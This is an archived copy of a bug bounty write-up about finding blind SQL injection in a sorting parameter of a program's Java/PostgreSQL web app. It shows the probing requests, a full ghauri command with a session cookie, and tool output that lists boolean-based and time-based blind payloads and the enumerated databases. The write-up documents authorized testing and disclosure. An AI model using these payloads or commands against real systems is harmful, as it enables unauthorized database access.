---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-06-03_how-i-got-my-first-bounty.md
original_filename: 2024-06-03_how-i-got-my-first-bounty.md
title: How I Got My First €€€€ Bounty
category: documents
detected_topics:
- sqli
- command-injection
- api-security
tags:
- imported
- documents
- sqli
- command-injection
- api-security
language: en
raw_sha256: ffa90a79e3ec64ad8f00239e3ab618aa2372f2ee95604d93b2b6274a4f628a53
text_sha256: 674de43aecf400b3d7ff04f4a944bbb7518a10582248a8a43f86a2ad29a1ddcf
ingested_at: '2026-06-28T07:32:34Z'
sensitivity: unknown
redactions_applied: false
---

# How I Got My First €€€€ Bounty

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-06-03_how-i-got-my-first-bounty.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, api-security
- Ingested At: 2026-06-28T07:32:34Z
- Redactions Applied: False
- Raw SHA256: `ffa90a79e3ec64ad8f00239e3ab618aa2372f2ee95604d93b2b6274a4f628a53`
- Text SHA256: `674de43aecf400b3d7ff04f4a944bbb7518a10582248a8a43f86a2ad29a1ddcf`


## Content

---
title: "How I Got My First €€€€ Bounty"
url: "https://machiavellli.medium.com/how-i-got-my-first-bounty-65ad8a1763de"
authors: ["Machiavelli (@MachIaVellill)"]
bugs: ["SQL injection"]
publication_date: "2024-06-03"
added_date: "2024-06-05"
source: "pentester.land/writeups.json"
original_index: 267
scraped_via: "browseros"
---

# How I Got My First €€€€ Bounty

How I Got My First €€€€ Bounty
Machiavelli
Follow
3 min read
·
Jun 3, 2024

1K

11

Disclaimer: This isn’t meant to teach anything new — just sharing a personal experience.
سَلامٌ

Better reading experience > machiavelli.me

I’ll share in this write-up how I discovered my first €€€€ bounty.

At first, I started with basic manual recon because the program’s scope was just a set of URLs related to different services, such as:

- https://ex.admin.service.example.com
- https://ex.service.service.example.com
- https://ex.abc.service.example.com

The program also provided credentials to test different roles.

I then browsed the sites while proxying the traffic through Burp and testing the functionalities like a normal user. However, there weren’t any interesting features — except for the sorting functionality. I noticed some intriguing parameters that I had already seen in some JS files:

“SelectedSources” and “SelectedTemplateNames”.

Get Machiavelli’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

At first, I thought they might fetch data from a database (yeah that makes sense :D), so I decided to test them with special characters, searching for anomalies like “{“, ‘, \}”. When I entered a single quote, I got a “500 HTTP status code (Internal Server Error)”. Adding another single quote returned a “200 HTTP status code (OK)”.

https://ex.service.example.com/history?selectedSources=someSources' > 500
https://ex.service.example.com/history?selectedSources=someSources'' > 200

Sometimes, I use a backslash to confirm my suspicions. In this case, I got a “400 Bad Request” (since it was a Java app running on Apache Tomcat, the backslash needed to be encoded as “%5c”).

https://ex.service.example.com/history?selectedSources=someSources\' > 400

After that, I tried running “sqlmap” to extract the database version. Unfortunately, “sqlmap” didn’t retrieve anything except that the DBMS was “PostgreSQL”. However, I didn’t give up — I switched to “ghauri” instead:

ghauri -u "https://ex.service.example.com/history?selectedSources=someSources" --dbms=postgres --cookie="JSESSIONID=09326D266052B6B0F7E391B7BBD3A284" --dbs

Boom!

[09:22:32] [INFO] testing connection to the target URL
Ghauri resumed the following injection point(s) from stored session:  
Parameter: selectedSources (GET)  
  Type: boolean-based blind  
  Title: OR boolean-based blind - WHERE or HAVING clause  
  Payload: selectedSources=someSources') OR 06690=6690 OR ('04586'='4586  
  
  Type: time-based blind  
  Title: PostgreSQL > 8.1 AND time-based blind (comment)  
  Payload: selectedSources=someSources') AND 4564=(SELECT 4564 FROM PG_SLEEP(6)) OR ('04586'='4586  
[09:22:33] [INFO] testing PostgreSQL
[09:22:34] [INFO] confirming PostgreSQL
[09:22:34] [INFO] the back-end DBMS is PostgreSQL
[09:22:34] [INFO] fetching database names
[09:22:34] [INFO] fetching number of databases
[09:22:51] [INFO] retrieved: 3 
[09:26:01] [INFO] retrieved: information_schema 
[09:27:51] [INFO] retrieved: pg_catalog 
[09:28:57] [INFO] retrieved: public 
available databases [3]:
[*] pg_catalog
[*] public
[*] information_schema

I reported the vulnerability, and within just one hour, the triager forwarded my report to the company. They quickly acknowledged the issue.

Press enter or click to view image in full size

The next day, the company awarded me a bounty.

Press enter or click to view image in full size
Final Thoughts:

Don’t limit yourself to just one tool, technique, or program you don’t fully understand — it will only burn you out. The internet is already full of vulnerabilities waiting to be discovered.

Twitter/X: https://x.com/MachIaVellill

سَلامٌ
